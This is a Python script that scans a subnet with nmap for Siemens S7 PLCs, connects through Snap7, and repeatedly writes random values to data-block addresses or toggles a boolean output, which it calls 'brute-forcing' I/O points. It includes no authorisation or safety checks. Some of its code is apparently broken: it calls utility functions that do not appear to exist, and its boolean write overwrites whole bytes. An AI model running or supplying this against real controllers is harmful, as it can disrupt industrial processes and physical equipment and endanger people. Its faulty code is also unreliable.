import snap7  # Assuming you are using Snap7 for PLC communication
import time
import random
import subprocess  # For finding the PLC's IP address (optional)

# Configuration (Adjust these based on your environment)
# If you know the IP, set FIND_PLC_IP to False and PLC_IP directly
FIND_PLC_IP = True  # Set to True if you need to find the PLC IP
PLC_IP = None  # Set this if FIND_PLC_IP is False
RACK = 0
SLOT = 1
DB_NUMBER = 1  # Example: Data Block number
START_ADDRESS = 0  # Example: Starting address in the data block
DATA_TYPE = 'REAL'  # Example: Data type to write (e.g., 'REAL', 'INT', 'BOOL')
NUM_POINTS = 10  # Example: Number of consecutive points to brute-force (if brute-forcing a range)
SLEEP_TIME = 0.1  # Time to wait between I/O changes (seconds)
BRUTE_FORCE_VALUE_RANGE = (0.0, 100.0)  # Min/Max values for brute-forcing (if applicable)
SINGLE_POINT_ADDRESS = 0  # address of specific output signal (e.g. 0.0 if %Q0.0)
NUM_ITERATIONS = 100  # How many times to toggle the single point

# Function to find the PLC's IP address (Requires nmap installed)
def find_plc_ip():
    try:
        # Replace '192.168.1.0/24' with your network's subnet
        result = subprocess.run(['nmap', '-p', '102', '-sV', '192.168.1.0/24'], capture_output=True, text=True)
        output = result.stdout
        # Parse the output to find the IP address of the PLC.
        #  This is a simplified example and may need adjustment based on your nmap output.
        for line in output.splitlines():
            if "Siemens S7" in line:
                parts = line.split()
                plc_ip = parts[0]
                print(f"Found PLC IP address: {plc_ip}")
                return plc_ip
        print("PLC with Siemens S7 service not found.")
        return None
    except FileNotFoundError:
        print("Error: nmap not found. Please install nmap and ensure it's in your PATH.")
        return None
    except Exception as e:
        print(f"An error occurred while trying to find the PLC IP: {e}")
        return None


# Function to write a single value to the PLC
def write_to_plc(plc, db_number, address, data_type, value):
    try:
        if data_type == 'REAL':
            plc.db_write(db_number, address, snap7.util.transform_single(value))  # Ensure correct size
        elif data_type == 'INT':
            plc.db_write(db_number, address, snap7.util.transform_int(int(value)))
        elif data_type == 'BOOL':
            # Boolean values are handled differently in Snap7 - use a byte array.
            byte_array = bytearray([1 if value else 0])
            plc.db_write(db_number, address // 8, byte_array)
        else:
            print(f"Unsupported data type: {data_type}")
            return
        print(f"Wrote value {value} to DB{db_number}.DB{address} ({data_type})")

    except Exception as e:
        print(f"Error writing to PLC: {e}")


def brute_force_range(plc, db_number, start_address, data_type, num_points, value_range):
    """
    Brute-forces a range of consecutive I/O points.
    """
    min_val, max_val = value_range
    for i in range(num_points):
        address = start_address + i
        random_value = random.uniform(min_val, max_val)
        write_to_plc(plc, db_number, address, data_type, random_value)
        time.sleep(SLEEP_TIME)

def brute_force_single_point(plc, db_number, address, data_type, num_iterations):
    """
    Toggles a single I/O point repeatedly. Good for BOOL.
    """
    for i in range(num_iterations):
        # Toggle the boolean value.  Read, invert, write.
        if data_type == "BOOL":
            try:
                read_data = plc.db_read(db_number, address // 8, 1)  # Read 1 byte to get the bit
                current_value = snap7.util.get_bool(read_data, 0, address % 8)  # Get the specific bit
                new_value = not current_value # Invert the value.
                byte_array = bytearray([1 if new_value else 0]) # create bytearray
                plc.db_write(db_number, address // 8, byte_array)
                print(f"Toggled DB{db_number}.DB{address} from {current_value} to {new_value}")
            except Exception as e:
                print(f"Error toggling DB{db_number}.DB{address}: {e}")
        else:
            print("Error: This method only supports BOOL data type")
            return
        time.sleep(SLEEP_TIME)


def main():
    global PLC_IP  # Use the global variable
    if FIND_PLC_IP:
        PLC_IP = find_plc_ip()
        if not PLC_IP:
            print("Could not find PLC IP address. Exiting.")
            return

    if not PLC_IP:
        print("PLC_IP not set.  Please either set it directly or enable FIND_PLC_IP.")
        return


    plc = snap7.client.Client()
    try:
        plc.connect(PLC_IP, RACK, SLOT)
        print(f"Connected to PLC at {PLC_IP}")

        # Choose ONE of the brute-force methods below, or create another option

        # Option 1: Brute-force a range of I/O points
        # brute_force_range(plc, DB_NUMBER, START_ADDRESS, DATA_TYPE, NUM_POINTS, BRUTE_FORCE_VALUE_RANGE)

        # Option 2: Brute-force a single I/O point by repeatedly toggling it (For BOOL)
        brute_force_single_point(plc, DB_NUMBER, SINGLE_POINT_ADDRESS, DATA_TYPE, NUM_ITERATIONS)

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")


if __name__ == "__main__":
    main()